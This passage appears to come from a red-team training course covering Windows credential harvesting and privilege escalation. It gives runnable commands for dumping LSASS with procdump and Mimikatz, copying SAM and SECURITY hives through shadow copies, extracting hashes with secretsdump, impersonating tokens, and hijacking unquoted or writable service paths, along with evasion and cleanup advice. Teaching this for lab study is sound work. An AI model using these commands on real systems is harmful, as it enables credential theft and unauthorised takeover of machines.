(typically Administrator or SYSTEM).</li>\n</ul>\n</li>\n<li><p><strong>SAM and SECURITY Registry Hives:</strong></p>\n<ul>\n<li>These are files located at <code>C:\\Windows\\System32\\config\\SAM</code> and <code>C:\\Windows\\System32\\config\\SECURITY</code>.</li>\n<li><strong>SAM (Security Account Manager):</strong> Contains the local user accounts database, including their NTLM password hashes. This is for <em>local</em> accounts on that specific machine.</li>\n<li><strong>SECURITY:</strong> Contains the LSA Secrets, which can include cached domain controller credentials, service account passwords, and other system-level secrets.</li>\n<li>These files are locked while Windows is running normally. To access them, you need SYSTEM privileges and often need to access them <em>offline</em> or via a method that bypasses the file lock (like Volume Shadow Copy).</li>\n</ul>\n</li>\n<li><p><strong>Credential Manager:</strong></p>\n<ul>\n<li>This is a user-specific store (<code>%APPDATA%\\Microsoft\\Credentials</code> and <code>%LOCALAPPDATA%\\Microsoft\\Credentials</code>).</li>\n<li>Users can save credentials here for things like:<ul>\n<li>RDP connections</li>\n<li>Network shares</li>\n<li>Websites (less common now, browsers handle this)</li>\n<li>Specific applications</li>\n</ul>\n</li>\n<li>These credentials are encrypted using the user&#39;s login credentials as part of the key derivation. Accessing <em>another user&#39;s</em> Credential Manager requires SYSTEM privileges to decrypt their data.</li>\n</ul>\n</li>\n<li><p><strong>LSA Secrets (Older/Specific):</strong></p>\n<ul>\n<li>While some LSA Secrets are in the SECURITY hive, some might be accessible differently. These often relate to machine accounts, service accounts, or cached domain credentials.</li>\n</ul>\n</li>\n</ol>\n<p>Understanding these locations tells us <em>where</em> our tools need to look and <em>what privileges</em> are required for each method.</p>\n<h3><strong>2.5: Dumping LSASS Process Memory</strong></h3>\n<p>This is arguably the most common and often most fruitful method for harvesting credentials from a live system.</p>\n<p><strong>Why Dump LSASS?</strong> Because it holds the most <em>current</em> and <em>active</em> credential information, including sometimes cleartext passwords or easily reusable hashes/tickets.</p>\n<p><strong>Requirement:</strong> Administrator or SYSTEM privileges on the target machine.</p>\n<p><strong>Technique 1: Using <code>procdump</code> (Sysinternals)</strong></p>\n<p><code>procdump</code> is a legitimate Microsoft Sysinternals tool used by developers and administrators to troubleshoot application crashes by creating process dumps. We can repurpose it to dump the memory of <code>lsass.exe</code>.</p>\n<ul>\n<li><strong>Step 1: Obtain <code>procdump</code>:</strong> Download the Sysinternals suite or just <code>procdump.exe</code>. You&#39;ll need to get this executable onto the target machine (or run it remotely if you have that capability).</li>\n<li><strong>Step 2: Run <code>procdump</code> on <code>lsass.exe</code>:</strong><pre><code class=\"language-cmd\">procdump.exe -accepteula -ma lsass.exe lsass.dmp\n</code></pre>\n<ul>\n<li><code>-accepteula</code>: Automatically accepts the End-User License Agreement.</li>\n<li><code>-ma</code>: Writes a dump file with all process memory. This is crucial for capturing credentials.</li>\n<li><code>lsass.exe</code>: The target process name.</li>\n<li><code>lsass.dmp</code>: The output file name for the memory dump.</li>\n</ul>\n</li>\n<li><strong>Step 3: Exfiltrate the dump file:</strong> Copy <code>lsass.dmp</code> from the target machine back to your attacker machine.</li>\n<li><strong>Step 4: Analyze the dump file:</strong> Use a tool <em>on your attacker machine</em> to read the <code>lsass.dmp</code> file and extract credentials. The most famous tool for this is <strong>Mimikatz</strong>.</li>\n</ul>\n<p><strong>Technique 2: Using Mimikatz (Direct or via Loader)</strong></p>\n<p>Mimikatz, created by Benjamin Delpy (<code>@gentilkiwi</code>), is the <em>de facto</em> tool for Windows credential operations. It can interact directly with LSASS memory or analyze dump files. <em>However</em>, directly executing <code>mimikatz.exe</code> is <em>highly</em> likely to be detected and blocked by Antivirus (AV) and Endpoint Detection and Response (EDR) solutions.</p>\n<p>Attackers and red teamers use various methods to run Mimikatz functionality while avoiding detection, such as:</p>\n<ul>\n<li>Reflective DLL injection (running the Mimikatz DLL directly in memory).</li>\n<li>Loading it via PowerShell (e.g., <code>Invoke-Mimikatz</code> from PowerSploit).</li>\n<li>Using custom loaders or obfuscated versions.</li>\n</ul>\n<p>For the purpose of this module, we will focus on the <em>concept</em> and the <em>output</em> you&#39;d expect, and use <code>Invoke-Mimikatz</code> from PowerSploit in the lab exercise as a common method (while acknowledging it might require AV bypass in a real scenario, which is a topic for more advanced courses).</p>\n<ul>\n<li><p><strong>Conceptual Steps (using <code>Invoke-Mimikatz</code>):</strong></p>\n<ul>\n<li>Get the <code>Invoke-Mimikatz.ps1</code> script onto the target.</li>\n<li>Import the script: <code>Import-Module .\\Invoke-Mimikatz.ps1</code></li>\n<li>Run the relevant command: <code>Invoke-Mimikatz -Command &#39;&quot;sekurlsa::logonpasswords&quot;&#39;</code></li>\n<li>The output will appear directly in your PowerShell session.</li>\n</ul>\n</li>\n<li><p><strong>Analyzing a Dump File with Mimikatz (on your attacker machine):</strong></p>\n<ul>\n<li>Transfer <code>lsass.dmp</code> to your attacker machine.</li>\n<li>Run Mimikatz (the executable).</li>\n<li>Point Mimikatz to the dump file: <code>sekurlsa::minidump lsass.dmp</code></li>\n<li>Run the command to extract passwords: <code>sekurlsa::logonpasswords</code></li>\n<li>Exit Mimikatz: <code>exit</code></li>\n</ul>\n</li>\n</ul>\n<p><strong>Expected Mimikatz Output (Conceptual):</strong></p>\n<p>Mimikatz output is verbose but incredibly valuable. Look for sections like:</p>\n<pre><code>Authentication Id : 0 ; 999 (00000000:000003e7)\nSession           : Interactive from 2\nUser Name         : targetuser\nDomain            : TARGETDOMAIN\nLogon Server      : TARGETDC\n...\n msv            : [00000003]\n -&gt; primary\n    * Username : targetuser\n    * Domain   : TARGETDOMAIN\n    * NTLM     : 11223344556677889900AABBCCDDEEFF\n    * SHA1     : AABBCCDDEEFF11223344556677889900AABBCCDD\n    * CredentialData : (null)\n -&gt; logon sspi\n    * Username : targetuser\n    * Domain   : TARGETDOMAIN\n    * Password : ReallySecretPassword123!   &lt;-- !!! Cleartext passwords are GOLD !!!\n...\n kerberos       : [00000001]\n -&gt; primary\n    * Username : targetuser\n    * Domain   : TARGETDOMAIN\n    * NTLM     : 11223344556677889900AABBCCDDEEFF\n    * SHA1     : AABBCCDDEEFF11223344556677889900AABBCCDD\n    * Kerberos : (null)\n    * Pkinit   : (null)\n...\n</code></pre>\n<p>Look for <code>Password :</code> followed by cleartext, or the <code>NTLM :</code> hash. The NTLM hash can often be used directly for authentication (Pass-the-Hash, Module 6!).</p>\n<p><strong>OpSec Note:</strong> Accessing or dumping LSASS is a <em>very</em> common detection signature for security products. In a real red team engagement, this requires careful planning and likely AV/EDR bypass techniques. For our lab, we&#39;ll accept the risk of detection as we focus on the technique itself.</p>\n<h3><strong>2.6: Extracting from SAM and SECURITY Registry Hives</strong></h3>\n<p>While LSASS is the primary target for <em>active</em> credentials, the SAM and SECURITY hives contain local user hashes and system secrets that can be valuable, especially if LSASS dumping is blocked or fails.</p>\n<p><strong>Why Target SAM/SECURITY Hives?</strong></p>\n<ul>\n<li>Contains local user password hashes (SAM hive).</li>\n<li>Contains LSA Secrets (SECURITY hive), which can include cached domain credentials, service account passwords, etc.</li>\n</ul>\n<p><strong>Requirement:</strong> SYSTEM privileges on the target machine are generally needed to access these files or their contents reliably.</p>\n<p><strong>Techniques:</strong></p>\n<p>The challenge is that these files (<code>C:\\Windows\\System32\\config\\SAM</code>, <code>SECURITY</code>, <code>SYSTEM</code>) are locked by the operating system while it&#39;s running.</p>\n<ol>\n<li><p><strong>Offline Access:</strong> If you have physical access or can boot the machine from a different OS (like a Linux live CD), you can mount the Windows drive and simply copy these files.</p>\n<ul>\n<li>Copy <code>C:\\Windows\\System32\\config\\SAM</code></li>\n<li>Copy <code>C:\\Windows\\System32\\config\\SECURITY</code></li>\n<li>Copy <code>C:\\Windows\\System32\\config\\SYSTEM</code> (The <code>SYSTEM</code> hive is needed to decrypt the contents of the <code>SECURITY</code> hive).</li>\n<li>Analyze these files on your attacker machine using tools like Impacket&#39;s <code>secretsdump.py</code>.</li>\n</ul>\n</li>\n<li><p><strong>Volume Shadow Copy (VSS):</strong> This is a common technique used by attackers to access locked files on a live system. VSS creates snapshots of volumes, and files in snapshots are not locked by the running OS.</p>\n<ul>\n<li><strong>Step 1: Create a Shadow Copy:</strong><pre><code class=\"language-cmd\">vssadmin create shadow /for=C:\n</code></pre>\nThis command will output the path to the shadow copy (e.g., <code>\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopyX\\</code>). Note this path down.</li>\n<li><strong>Step 2: Copy Hives from the Shadow Copy:</strong> Use the shadow copy path to access the files.<pre><code class=\"language-cmd\">copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopyX\\Windows\\System32\\config\\SAM C:\\Temp\\sam.hiv\ncopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopyX\\Windows\\System32\\config\\SECURITY C:\\Temp\\security.hiv\ncopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopyX\\Windows\\System32\\config\\SYSTEM C:\\Temp\\system.hiv\n</code></pre>\n<em>(Replace <code>X</code> with the correct shadow copy number and <code>C:\\Temp\\</code> with your desired location)</em></li>\n<li><strong>Step 3: Delete the Shadow Copy (OpSec):</strong> Clean up the shadow copy you created.<pre><code class=\"language-cmd\">vssadmin delete shadows /for=C: /Quiet\n</code></pre>\n</li>\n<li><strong>Step 4: Exfiltrate the hive files:</strong> Copy <code>sam.hiv</code>, <code>security.hiv</code>, and <code>system.hiv</code> from the target machine to your attacker machine.</li>\n<li><strong>Step 5: Analyze the hive files:</strong> Use a tool <em>on your attacker machine</em> to extract hashes and secrets. Impacket&#39;s <code>secretsdump.py</code> is excellent for this.</li>\n</ul>\n</li>\n</ol>\n<ul>\n<li><p><strong>Using <code>secretsdump.py</code> (Impacket - on attacker machine):</strong></p>\n<pre><code class=\"language-bash\">secretsdump.py -sam sam.hiv -security security.hiv -system system.hiv LOCAL\n</code></pre>\n<ul>\n<li>This command takes the three hive files as input and will output local user NTLM hashes (from SAM) and LSA Secrets (from SECURITY).</li>\n</ul>\n</li>\n<li><p><strong>Using Mimikatz (Live or via Shadow Copy):</strong> Mimikatz can also dump SAM and SECURITY hives directly, often automating the VSS step or using other techniques.</p>\n<ul>\n<li><strong>Conceptual Command:</strong> <code>mimikatz.exe &quot;lsadump::sam&quot; exit</code> or <code>mimikatz.exe &quot;token::elevate&quot; &quot;lsadump::sam&quot; exit</code> (if needing to elevate first). <code>lsadump::secrets</code> for LSA Secrets.</li>\n</ul>\n</li>\n</ul>\n<p><strong>Expected Output (SAM/SECURITY Hive Analysis):</strong></p>\n<ul>\n<li><p><strong>SAM:</strong> You&#39;ll get a list of local users and their NTLM hashes in a format like:<br><code>Username:RID:LMHash:NTLMHash:::</code>. The LM hash is usually empty on modern systems. The NTLM hash is the important part.<br><code>Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</code> (This is the hash for a blank password - very common in labs!)<br><code>LocalUser:1001:NO PASSWORD*********************:AABBCCDDEEFF11223344556677889900:::</code></p>\n</li>\n<li><p><strong>SECURITY (LSA Secrets):</strong> You might find cached domain credentials, service account passwords, or other system secrets. The output format varies but look for things like <code>_SC_</code> (Service Control) entries or cached domain logons.</p>\n</li>\n</ul>\n<p><strong>OpSec Note:</strong> Creating shadow copies and copying hive files leaves forensic artifacts (event logs, file access timestamps). Executing tools like Mimikatz or scripts that automate this are also high-detection activities.</p>\n<h3></h3>\n\n                </div>\n             </div>\n         ",
    "module-3": "\n             <div class=\"card main-content-card\"> <!-- Added main-content-card class -->\n                <h1>Module 3: module_3</h1> <!-- Use module title here -->\n                <div class=\"markdown-content\">\n                    <p>Alright team, buckle up! We&#39;ve secured that initial foothold, which is fantastic! But let&#39;s be real ‚Äì landing as a standard user on a Windows box usually means we&#39;re still quite limited. We can look around a bit, maybe poke at some files, but we can&#39;t install tools, modify critical system settings, or access sensitive data protected by Administrator permissions.</p>\n<p>This is where Module 3 comes in. This is where we turn that humble user access into the keys to the kingdom on that specific host. This module is all about <strong>Privilege Escalation (PE)</strong> ‚Äì the art and science of elevating our access from a low-privileged user to a high-privileged user, typically Administrator or even SYSTEM.</p>\n<p>Think of it like getting past the first guard at the gate (initial access), but then needing to find a way to get the master key instead of just a visitor&#39;s badge.</p>\n<hr>\n<h2><strong>Module 3: Windows Privilege Escalation</strong></h2>\n<p><strong>Module Objective:</strong> By the end of this module, you will be able to systematically enumerate a Windows host for common privilege escalation vectors and successfully exploit at least one method to gain Administrator or SYSTEM level access in a lab environment.</p>\n<p><strong>The &quot;Why&quot;:</strong> Why is PE so critical?</p>\n<ol>\n<li><strong>Access to Sensitive Data:</strong> Administrators and SYSTEM have access to nearly all files, registry keys, and processes on the host. This is where you find sensitive documents, configuration files, and crucially, credentials cached in memory or stored locally.</li>\n<li><strong>Persistence:</strong> Higher privileges make it much easier to establish persistent backdoors (e.g., installing services, modifying startup locations that run with high privileges).</li>\n<li><strong>Springboard for Lateral Movement:</strong> Administrator or SYSTEM access on one machine often provides credentials or tokens that can be reused or leveraged to authenticate to <em>other</em> machines in the network, especially in a domain environment.</li>\n<li><strong>Control:</strong> With high privileges, you can disable security software, clear logs, modify system behavior, and generally operate with less restriction.</li>\n</ol>\n<p><strong>The Mindset:</strong> Privilege escalation isn&#39;t usually one magic bullet. It&#39;s a process of:</p>\n<ol>\n<li><strong>Thorough Enumeration:</strong> What is running? What software is installed? What are the permissions on key files and services? What patches are missing? What are the user&#39;s current privileges?</li>\n<li><strong>Identifying Weaknesses:</strong> Based on your enumeration, spot misconfigurations, known vulnerabilities, or design flaws.</li>\n<li><strong>Planning the Attack:</strong> Determine which identified weakness is most likely to succeed and requires the least risk/noise.</li>\n<li><strong>Execution:</strong> Carry out the exploit.</li>\n<li><strong>Verification:</strong> Confirm you now have higher privileges.</li>\n</ol>\n<p>Let&#39;s dive deep into the core concepts and techniques!</p>\n<hr>\n<h3><strong>3.1 Understanding Windows Integrity Levels and UAC</strong></h3>\n<p>Before we exploit, we need to understand the security model we&#39;re trying to bypass.</p>\n<ul>\n<li><p><strong>Security Identifiers (SIDs):</strong> Every user, group, and service account in Windows has a unique SID (e.g., <code>S-1-5-21-...-500</code> for the built-in Administrator). Permissions are granted to SIDs, not just names.</p>\n</li>\n<li><p><strong>Access Control Lists (ACLs):</strong> Objects (files, folders, registry keys, services, processes, shares) have ACLs which contain Access Control Entries (ACEs). Each ACE specifies permissions (Read, Write, Execute, Modify, Full Control) for a specific SID. PE often involves finding objects where a low-privileged user&#39;s SID has more permissions than intended.</p>\n</li>\n<li><p><strong>Integrity Levels (IL):</strong> Introduced in Windows Vista (along with UAC), ILs add another layer to the security model. Processes run at different integrity levels:</p>\n<ul>\n<li><strong>Low:</strong> Highly restricted (e.g., Internet Explorer in Protected Mode). Cannot write to most system locations.</li>\n<li><strong>Medium:</strong> Standard user processes. Cannot write to system directories without elevation prompt.</li>\n<li><strong>High:</strong> Administrator processes (after UAC elevation).</li>\n<li><strong>SYSTEM:</strong> The highest privilege level. Used by the OS kernel and core services. Has full control over the system.</li>\n<li><strong>Trusted Installer:</strong> Even higher than SYSTEM for specific protected system files.</li>\n</ul>\n<p>A process running at a lower integrity level <em>cannot</em> write to or modify objects running at a higher integrity level. This is a fundamental security boundary.</p>\n</li>\n<li><p><strong>User Account Control (UAC):</strong> This is probably what you see most often. When a standard user (Medium IL) tries to perform an action requiring Administrator privileges (e.g., installing software, changing system-wide settings), Windows prompts the user.</p>\n<ul>\n<li>If the user <em>is</em> a member of the Administrators group, they get a consent prompt (&quot;Do you want to allow this app...&quot;). If they click &quot;Yes,&quot; the process is launched with High integrity.</li>\n<li>If the user is <em>not</em> a member of the Administrators group, they get a credentials prompt, requiring them to enter an administrator username and password.</li>\n</ul>\n<p><strong>Crucially:</strong> UAC is designed to <em>prevent accidental</em> administrative actions and require user <em>consent</em>. It is <strong>not</strong> a security boundary against malicious code already running on the system <em>if</em> that code can interact with processes or components that are designed to auto-elevate or are vulnerable. A UAC bypass allows a Medium integrity process to launch a High integrity process <em>without</em> the user seeing or approving the prompt.</p>\n</li>\n</ul>\n<h3><strong>3.2 Common Privilege Escalation Vectors</strong></h3>\n<p>Now that we understand the target environment&#39;s security features, let&#39;s look at specific weaknesses we can exploit. Remember, <strong>enumeration is key</strong> to finding these!</p>\n<h4><strong>3.2.1 Vulnerable Services</strong></h4>\n<p>Services are background processes that often run with high privileges (SYSTEM, LocalSystem, LocalService, NetworkService) and start automatically when the system boots. Misconfigurations here are a goldmine for PE.</p>\n<ul>\n<li><p><strong>What to Enumerate:</strong></p>\n<ul>\n<li>List all services: <code>Get-Service</code> (PowerShell) or <code>tasklist /svc</code> (CMD).</li>\n<li>Check service configuration: <code>sc qc &lt;service_name&gt;</code> (CMD) or <code>Get-CimInstance win32_service -Filter &quot;Name=&#39;&lt;service_name&gt;&#39;&quot; | Select-Object Name, DisplayName, PathName, StartMode, State, Status, ServiceType, StartName</code> (PowerShell). Look at <code>PathName</code> (the executable path) and <code>StartName</code> (the account it runs as, usually SYSTEM or LocalSystem).</li>\n<li>Check permissions on the service executable path: <code>icacls &quot;&lt;path_to_service_exe&gt;&quot;</code> (CMD) or <code>Get-Acl &quot;&lt;path_to_service_exe&gt;&quot; | Format-List Path, Owner, Access</code> (PowerShell). Look for Write/Modify permissions for &#39;BUILTIN\\Users&#39; or &#39;Everyone&#39;.</li>\n<li>Check permissions on the service configuration key in the registry: Services are configured under <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\&lt;service_name&gt;</code>. Check permissions on this key using <code>reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\&lt;service_name&gt; /v SD</code> (CMD, then interpret SDDL) or <code>Get-Acl &quot;HKLM:\\SYSTEM\\CurrentControlSet\\Services\\&lt;service_name&gt;&quot; | Format-List Path, Owner, Access</code> (PowerShell). Look for Write permissions for low-priv groups.</li>\n</ul>\n</li>\n<li><p><strong>Common Vulnerabilities &amp; Exploitation:</strong></p>\n<ul>\n<li><p><strong>Unquoted Service Path:</strong> If the <code>PathName</code> of a service contains spaces and is <em>not</em> enclosed in quotes, Windows will try to execute the path segment by segment until it finds an executable.</p>\n<ul>\n<li>Example Path: <code>C:\\Program Files\\My Service\\service.exe</code></li>\n<li>Windows tries to execute:<ol>\n<li><code>C:\\Program.exe</code></li>\n<li><code>C:\\Program Files\\My.exe</code></li>\n<li><code>C:\\Program Files\\My Service\\service.exe</code> (the legitimate service)</li>\n</ol>\n</li>\n<li>If you, as a low-privileged user, have write permissions to <code>C:\\Program Files\\</code>, you could place a malicious <code>My.exe</code> there. The next time the service starts (system boot, manual start, or crash/restart), your malicious <code>My.exe</code> will execute <em>with the service&#39;s privileges</em> (often SYSTEM) instead of the legitimate service.</li>\n<li><strong>Identification:</strong> Look for services where <code>PathName</code> contains spaces and is missing quotes.<pre><code class=\"language-powershell\">Get-CimInstance win32_service | Where-Object {$_.PathName -notmatch &#39;&quot;&#39; -and $_.PathName -match &#39;\\s&#39;} | Select-Object Name, DisplayName, PathName, StartName\n</code></pre>\n<pre><code class=\"language-cmd\">wmic service get name,pathname,startmode | findstr /i &quot;Auto&quot; | findstr /i &quot;System&quot; | findstr /v &quot;&quot;&quot;\n</code></pre>\n(The CMD version is less precise but can find some). Then verify directory permissions using <code>icacls</code> on the directories (<code>C:\\</code>, <code>C:\\Program Files\\</code>, etc.).</li>\n<li><strong>Exploitation:</strong><ol>\n<li>Confirm you have write permissions to the directory where you&#39;ll place your malicious executable (e.g., <code>C:\\Program Files\\</code>).</li>\n<li>Create a malicious executable (e.g., <code>my.exe</code>) that performs your desired action (add a user, launch a shell, etc.). Make sure its name matches the segment Windows will try to execute (e.g., <code>My.exe</code> for <code>C:\\Program Files\\My Service\\service.exe</code>).</li>\n<li>Place <code>my.exe</code> in the vulnerable directory.</li>\n<li>Restart the service (if possible and low-risk, otherwise wait for system restart) using <code>Restart-Service &lt;service_name&gt;</code> (PowerShell) or <code>sc stop &lt;service_name&gt;</code> then <code>sc start &lt;service_name&gt;</code> (CMD). <em>Be cautious restarting services, it might break things!</em></li>\n<li>Your <code>my.exe</code> should execute with the service&#39;s privileges.</li>\n</ol>\n</li>\n</ul>\n</li>\n<li><p><strong>Weak Service Permissions (Service Binary/Configuration):</strong> If a low-privileged user has write/modify permissions on the service&#39;s executable file (<code>PathName</code>) or its registry configuration key, they can alter the service&#39;s behavior.</p>\n<ul>\n<li><strong>Identification:</strong> Check permissions as described above using <code>icacls</code> or <code>Get-Acl</code>. Look for &#39;Write&#39; or &#39;Modify&#39; permissions for your user or groups you belong to on the service executable or its registry key.<pre><code class=\"language-powershell\"># Check permissions on the service executable (replace path)\nGet-Acl &quot;C:\\Program Files\\Vulnerable Service\\vulnerable.exe&quot; | Format-List Path, Owner, Access\n\n# Check permissions on the service registry key (replace service name)\nGet-Acl &quot;HKLM:\\SYSTEM\\CurrentControlSet\\Services\\VulnerableService&quot; | Format-List Path, Owner, Access\n</code></pre>\n</li>\n<li><strong>Exploitation (Modifying Binary):</strong><ol>\n<li>If you have write access to the service executable, rename the original (<code>vulnerable.exe</code> to <code>vulnerable.exe.bak</code>).</li>\n<li>Place your malicious executable (named <code>vulnerable.exe</code>) in its place.</li>\n<li>Restart the service. Your malicious executable runs with service privileges.</li>\n</ol>\n</li>\n<li><strong>Exploitation (Modifying Config):</strong><ol>\n<li>If you have write access to the service&#39;s registry key, you can modify the <code>ImagePath</code> value to point to your malicious executable.</li>\n<li>Restart the service. Your malicious executable runs.</li>\n</ol>\n<pre><code class=\"language-powershell\"># Example: Modify ImagePath (replace service and path)\nSet-ItemProperty -Path &quot;HKLM:\\SYSTEM\\CurrentControlSet\\Services\\VulnerableService&quot; -Name &quot;ImagePath&quot; -Value &quot;C:\\Path\\To\\Your\\Malicious.exe&quot;\n# Then restart service\nRestart-Service VulnerableService\n</code></pre>\n<p><em>Again, be very careful modifying service configurations or binaries, this can easily break the system!</em></p>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h4><strong>3.2.2 Token Manipulation / Impersonation</strong></h4>\n<p>Windows uses &quot;tokens&quot; to represent the security context of a user or process. Tokens contain SIDs, privileges, integrity levels, etc. Certain privileges allow a process to impersonate another user&#39;s token.</p>\n<ul>\n<li><strong><code>SeImpersonatePrivilege</code> or <code>SeAssignPrimaryTokenPrivilege</code>:</strong> If a user or service account holds one of these privileges, they <em>might</em> be able to impersonate other logged-on users or service accounts on that system. Web servers or database servers often hold <code>SeImpersonatePrivilege</code> to impersonate clients.</li>\n<li><strong>Identification:</strong> Check your current user&#39;s privileges using <code>whoami /priv</code> (CMD) or <code>(Get-CimInstance win32_tokenprivileges -Filter &quot;GetEnabled=&#39;true&#39;&quot;).Privileges | Where-Object {$_.DisplayName -like &#39;*impersonate*&#39; -or $_.DisplayName -like &#39;*assign*&#39;}</code> (PowerShell - rough example).</li>\n<li><strong>Exploitation:</strong> This is typically exploited using tools like Mimikatz&#39;s <code>incognito</code> module.<pre><code># Example Mimikatz usage (requires Admin or SeDebugPrivilege)\nsekurlsa::logonpasswords  # Dumps credentials from LSASS\nincognito::list_tokens    # Lists impersonatable tokens\nincognito::impersonate_token &lt;Token_ID_or_Username&gt; # Impersonate a token\n# Or often used after getting SeDebugPrivilege to access LSASS\n</code></pre>\n<strong>Teacher&#39;s Note:</strong> Mimikatz is a <em>very</em> powerful tool for Windows security analysis, but it&#39;s also heavily detected by AV/EDR. Using it directly often requires bypassing security software. The <code>incognito</code> module allows you to potentially elevate <em>without</em> dumping credentials directly, by just leveraging existing tokens.</li>\n</ul>\n<h4><strong>3.2.3 Insecure File and Registry Permissions</strong></h4>\n<p>Similar to services, general file system or registry objects can have weak permissions allowing low-privileged users to modify files or keys that are later used or executed by high-privileged processes.</p>\n<ul>\n<li><strong>What to Enumerate:</strong><ul>\n<li>Permissions on critical directories: <code>C:\\</code>, <code>C:\\Program Files</code>, <code>C:\\Program Files (x86)</code>, <code>C:\\Windows\\System32</code>, <code>C:\\Windows\\Tasks</code>. Use <code>icacls &lt;directory&gt;</code>.</li>\n<li>Permissions on specific files in those directories, especially <code>.exe</code>, <code>.dll</code>, <code>.bat</code>, <code>.ps1</code>, <code>.vbs</code> files.</li>\n<li>Permissions on common persistence locations in the registry: <code>HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>, <code>HKCU\\...Run</code>, <code>HKLM\\...\\RunOnce</code>, <code>HKLM\\SYSTEM\\CurrentControlSet\\Services</code> (covered in services), Scheduled Tasks keys. Use <code>reg query &lt;key&gt; /v SD</code> or <code>Get-Acl &lt;Registry::Path&gt;</code>.</li>\n<li>Permissions on program directories where high-privilege software is installed.</li>\n</ul>\n</li>\n<li><strong>Identification:</strong> Look for &#39;Write&#39; or &#39;Modify&#39; permissions for &#39;BUILTIN\\Users&#39; or &#39;Everyone&#39; on files/keys that high-privilege processes interact with or execute.<pre><code class=\"language-powershell\"># Example: Check permissions on a common Run key\nGet-Acl &quot;HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run&quot; | Format-List Path, Owner, Access\n\n# Example: Find writable files in Program Files (this can be slow!)\n# Adjust filter/depth as needed. Be careful with recursion.\nGet-ChildItem -Path &quot;C:\\Program Files&quot; -Recurse -Force -ErrorAction SilentlyContinue | Get-Acl -ErrorAction SilentlyContinue | Where-Object {$_.AccessToString -match &quot;BUILTIN\\\\Users.*\\(M\\)&quot; -or $_.AccessToString -match &quot;Everyone.*\\(M\\)&quot; -or $_.AccessToString -match &quot;BUILTIN\\\\Users.*\\(W\\)&quot; -or $_.AccessToString -match &quot;Everyone.*\\(W\\)&quot;} | Select-Object Path\n</code></pre>\n</li>\n<li><strong>Exploitation:</strong><ul>\n<li><strong>DLL Hijacking:</strong> If a high-privilege process tries to load a DLL from a directory where you have write permissions, you can place a malicious DLL with the expected name there. The process might load <em>your</em> DLL instead of the legitimate one, executing your code with its privileges. This is complex and requires understanding DLL loading order.</li>\n<li><strong>Executable Replacement:</strong> If you have write access to an executable that&#39;s run by a high-privilege process (e.g., a scheduled task running as SYSTEM), you can replace the executable with your own.</li>\n<li><strong>Registry Modification:</strong> If you can write to a registry key that a high-privilege process reads or executes (like a Run key or a service <code>ImagePath</code>), you can inject a command or path to your malicious code.</li>\n</ul>\n</li>\n</ul>\n<h4><strong>3.2.4 Auto-logon Credentials / Saved RDP Credentials</strong></h4>\n<p>Sometimes systems are configured for automatic logon, storing credentials (often obfuscated) in the registry. Or users might save RDP credentials. While not a <em>privilege escalation</em> on the <em>current</em> host itself, finding these can give you high-privilege credentials for the <em>same</em> host or <em>other</em> hosts, effectively bypassing the need for a traditional PE exploit.</p>\n<ul>\n<li><strong>Identification:</strong> Look in the registry: <code>HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon</code> for <code>AutoAdminLogon</code>, <code>DefaultUserName</code>, <code>DefaultPassword</code>. Look for saved RDP connections and potentially extract credentials (though this is harder and often requires Admin).</li>\n<li><strong>Exploitation:</strong> Use tools (like Mimikatz or specific credential extractors) to retrieve the cleartext password or hash from the registry.</li>\n</ul>\n<h4><strong>3.2.5 Kernel Exploits</strong></h4>\n<p>These exploit vulnerabilities in the Windows kernel itself. They are often highly reliable for PE <em>if</em> the target system is running a vulnerable version of the kernel and hasn&#39;t been patched.</p>\n<ul>\n<li><strong>How they work (Conceptually):</strong> Kernel exploits typically involve tricking the kernel into executing malicious code in kernel mode, or manipulating kernel data structures to grant the attacker&#39;s process SYSTEM privileges.</li>\n<li><strong>Identification:</strong> This is primarily about <strong>identifying the exact OS version and patch level</strong> of the target (<code>systeminfo</code>, <code>Get-ComputerInfo</code>, <code>Get-HotFix</code>). Then, compare this information against public databases of known Windows kernel vulnerabilities and available exploits (e.g., Exploit-DB, security advisories).</li>\n<li><strong>Exploitation:</strong> Using a pre-compiled exploit binary or script designed for the <em>specific</em> vulnerable OS version/patch.<ul>\n<li><strong>Teacher&#39;s Note:</strong> Kernel exploits are powerful but risky. They can cause Blue Screens of Death (BSODs), are highly signatured by AV/EDR, and require precise targeting. In a real engagement, they are often a last resort. In a lab, they are valuable for understanding, but always use stable, known exploits and be prepared to snapshot/revert the VM. We will <em>not</em> be writing kernel exploit code, but rather focusing on identifying the <em>opportunity</em> and using existing tools if available in the lab.</li>\n</ul>\n</li>\n</ul>\n<h3><strong>3.3 Automated PE Tools</strong></h3>\n<p>Manually enumerating all the potential vectors above can be time-consuming. Fortunately, several excellent tools automate this process. They scan the system, look for common misconfigurations and vulnerabilities, and report potential PE paths.</p>\n<ul>\n<li><p><strong><code>PowerUp</code> (PowerShell):</strong> Part of the PowerSploit framework, <code>PowerUp</code> is a PowerShell script specifically designed to find common Windows PE vectors like vulnerable services, DLL hijacking opportunities, AlwaysInstallElevated, etc.</p>\n<ul>\n<li><strong>Usage:</strong><ol>\n<li>Load the script: <code>Import-Module .\\PowerUp.ps1</code> or dot-source it <code>. .\\PowerUp.ps1</code>.</li>\n<li>Run the main check function: <code>Invoke-AllChecks</code></li>\n</ol>\n</li>\n<li><strong>Output:</strong> <code>Invoke-AllChecks</code> will output a list of potential vulnerabilities found, often with suggestions on how to exploit them.</li>\n<li><strong>Teacher&#39;s Note:</strong> PowerShell scripts might be blocked by execution policies or Antivirus. You might need to bypass these, which is a separate topic (OpSec!).</li>\n</ul>\n</li>\n<li><p><strong><code>WinPEAS</code> (Windows Privilege Escalation Awesome Scripts):</strong> A standalone executable (<code>.exe</code>) that performs extensive local enumeration. It checks for file/registry permissions, services, processes, scheduled tasks, installed software, network information, credentials in files, and much more. It has both <code>.bat</code> and <code>.exe</code> versions, and different editions (e.g., <code>winPEASany.exe</code>).</p>\n<ul>\n<li><strong>Usage:</strong> Download and run the appropriate version.<pre><code 